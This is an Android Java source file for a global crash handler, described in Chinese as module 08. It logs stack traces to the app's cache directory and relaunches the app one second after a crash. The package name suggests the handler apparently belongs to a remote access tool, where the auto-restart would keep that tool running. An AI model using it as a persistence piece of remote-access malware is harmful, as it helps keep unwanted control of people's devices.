package com.vendor.rat.exception;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Process;
import android.os.SystemClock;
import android.util.Log;

import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * 全局异常处理器 (模块 08)
 *
 * 功能:
 *   - 记录崩溃日志到文件
 *   - 1 秒后自动重启应用
 */
public class GlobalExceptionHandler implements Thread.UncaughtExceptionHandler {

    private static final String TAG = "GlobalExceptionHandler";

    private final Context context;
    private final Thread.UncaughtExceptionHandler defaultHandler;

    public GlobalExceptionHandler(Context context) {
        this.context = context.getApplicationContext();
        this.defaultHandler = Thread.getDefaultUncaughtExceptionHandler();
    }

    public static void install(Context context) {
        Thread.setDefaultUncaughtExceptionHandler(
            new GlobalExceptionHandler(context));
    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        try {
            logCrash(thread, throwable);
            restartApp();
        } catch (Exception e) {
            if (defaultHandler != null) {
                defaultHandler.uncaughtException(thread, throwable);
            }
        }
    }

    private void logCrash(Thread thread, Throwable throwable) {
        StringWriter sw = new StringWriter();
        throwable.printStackTrace(new PrintWriter(sw));

        String crashLog = String.format(
            "Thread: %s\nTime: %s\nStack:\n%s",
            thread.getName(),
            new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(new Date()),
            sw.toString()
        );

        try {
            File logDir = new File(context.getCacheDir(), "logs");
            if (!logDir.exists()) logDir.mkdirs();

            File logFile = new File(logDir,
                "crash_" + System.currentTimeMillis() + ".log");
            FileWriter writer = new FileWriter(logFile);
            writer.write(crashLog);
            writer.close();
        } catch (Exception e) {
            Log.e(TAG, "Failed to write crash log", e);
        }
    }

    private void restartApp() {
        Intent intent = context.getPackageManager()
            .getLaunchIntentForPackage(context.getPackageName());

        if (intent != null) {
            intent.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);

            PendingIntent pendingIntent = PendingIntent.getActivity(
                context, 0, intent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);

            AlarmManager am = (AlarmManager)
                context.getSystemService(Context.ALARM_SERVICE);
            if (am != null) {
                am.set(AlarmManager.ELAPSED_REALTIME,
                    SystemClock.elapsedRealtime() + 1000, pendingIntent);
            }
        }

        Process.killProcess(Process.myPid());
        System.exit(1);
    }
}
